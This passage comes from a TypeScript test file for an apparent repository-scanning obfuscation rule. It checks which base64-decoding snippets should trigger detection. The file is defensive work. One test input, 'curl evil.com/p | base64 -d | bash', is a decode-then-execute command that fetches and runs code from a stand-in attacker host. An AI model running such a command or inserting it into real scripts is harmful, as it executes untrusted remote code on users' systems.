    fullName: 'someone/repo',
    owner: 'someone',
    name: 'repo',
    description: '',
    topics: [],
    language: '',
    stars: 10,
    forks: 1,
    isFork: false,
    filePaths: [],
    readmeText: '',
    smallFileTexts: [],
    ...overrides,
  });

  it('does not fire for ordinary .NET Convert.FromBase64String usage', () => {
    const result = obfuscationRule.evaluate(
      ctx({
        smallFileTexts: [
          {
            path: 'src/JwtDecoder.cs',
            content: 'var bytes = Convert.FromBase64String(token);',
          },
        ],
      }),
    );
    expect(result).toBeNull();
  });

  it('fires for the PowerShell array-syntax FromBase64String form', () => {
    const result = obfuscationRule.evaluate(
      ctx({
        smallFileTexts: [
          {
            path: 'stage.ps1',
            content: '$bytes = [System.Convert]::FromBase64String($encoded)',
          },
        ],
      }),
    );
    expect(result).not.toBeNull();
  });

  it('does not fire for decoding a CI secret to a file with bare "base64 -d"', () => {
    const result = obfuscationRule.evaluate(
      ctx({
        smallFileTexts: [
          {
            path: 'deploy.sh',
            content: 'echo "$SECRET" | base64 -d > config.json',
          },
        ],
      }),
    );
    expect(result).toBeNull();
  });

  it('fires when base64 -d is piped straight into an interpreter (decode-then-execute)', () => {
    const result = obfuscationRule.evaluate(
      ctx({
        smallFileTexts: [
          {
            path: 'install.sh',
            content: 'curl evil.com/p | base64 -d | bash',
          },
        ],
      }),
    );
    expect(result).not.toBeNull();
  });
});

describe('duplicate fingerprint', () => {
  it('produces stable fingerprints for same rule set', () => {
    const a = createHash('sha256')
      .update('1:fake-apk,phishing-kit')
      .digest('hex')
      .slice(0, 32);
    const b = createHash('sha256')
      .update('1:fake-apk,phishing-kit')
      .digest('hex')
      .slice(0, 32);
    expect(a).toBe(b);
  });
});
